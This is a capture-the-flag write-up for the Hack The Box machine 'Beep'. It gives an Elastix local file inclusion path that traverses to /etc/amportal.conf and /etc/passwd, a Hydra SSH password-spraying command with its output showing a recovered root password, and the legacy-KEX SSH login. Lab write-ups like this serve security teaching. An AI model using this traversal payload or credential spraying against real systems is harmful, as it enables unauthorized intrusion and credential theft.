# Beep

10.10.10.7

## Recon
This box is running Elastix which appears to be a phone controller. It also has what appears to be a mail service called Cyrus.

## Finding Vulns
While searching for vulnerabilities, we stumble across EDB-37637 which tells us Elastix has an LFI vulnerability. The vulnerable path is `/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`

We are able to use the same exploit to view `/etc/passwd`

## Exploitation
We found a few passwords in `amportal.conf` and some usernames in `/etc/passwd`. We added the users and passwords to custom wordlists and then sprayed ssh with them. Suprisingly, we have access to log in as root.

```bash
┌──(nate@kali-Dell)-[~/hackthebox/beep]                                                         [25/148]
└─$ hydra -L users -P passwords 10.10.10.7 ssh                                                          
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service
 organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). 
                                                                                                        
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-26 12:33:55                      
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the ta
sks: use -t 4                                                                                           
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous 
session found, to prevent overwriting, ./hydra.restore                                                  
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task              
[DATA] attacking ssh://10.10.10.7:22/                                                                   
[22][ssh] host: 10.10.10.7   login: root   password: jEhdIekWmdjE                                       
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-26 12:34:35
```

Unfortunately, we get an error message about the key exchange algorithm. Searching google we see this is a common issue when working with old systems. We're able to use a legacy KEX method using a config option:

```bash
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.10.7
```

We then specify the password which we found in the config file: `jEhdIekWmdjE`

## Flags

We find user flag at
`/home/fanis/user.txt`
and root flag at
`/root/root.txt`